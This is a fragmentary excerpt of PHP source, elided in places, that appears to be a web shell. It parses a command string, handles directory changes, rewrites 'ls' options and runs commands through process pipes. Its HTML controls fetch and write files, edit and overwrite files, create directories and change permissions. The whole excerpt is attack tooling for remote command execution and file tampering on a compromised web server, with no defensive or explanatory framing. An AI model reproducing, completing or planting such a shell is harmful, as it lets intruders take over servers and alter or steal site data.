...
//CHDIR tool
if (false !== strpos($cmd, 'chdir') and '0' == strpos($cmd, 'chdir')) {
    $boom = explode(' ', $cmd, 2);
    ...
    if (false !== @opendir($toDir) or @is_dir($toDir)) {
        $chdir = $toDir;
    } elseif (false !== @opendir($chdir . '/' . $toDir) or @is_dir($chdir . '/' . $toDir)) {
        $chdir = $chdir . '/' . $toDir;
    } else {
...
if (empty($post)) {
    ...
    if ('' == $fu or '0' == $fu or empty($fu)) {
        $showfu = '';
    } else {
        $showfu = "+'fu=$fu&'";
    }
    if ('' == $list or '0' == $list or empty($list)) {
        $showfl = '';
        $fl = 'on';
    } else {
        $showfl = "+'list=1&'";
...
if (false !== strpos($cmd, 'ls --')) {
    $cmd = str_replace('ls --', 'ls -F --', $cmd);
} elseif (false !== strpos($cmd, 'ls -')) {
    $cmd = str_replace('ls -', 'ls -F', $cmd);
} elseif (false !== strpos($cmd, ';ls')) {
    $cmd = str_replace(';ls', ';ls -F', $cmd);
} elseif (false !== strpos($cmd, '; ls')) {
...
function procc($what)
{
    ...
    if ($descpec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']]) {
...
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?=$fl; ?>" class="campo" onClick="list('<?=$fl; ?>')"><?php if (1 == $list) { ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
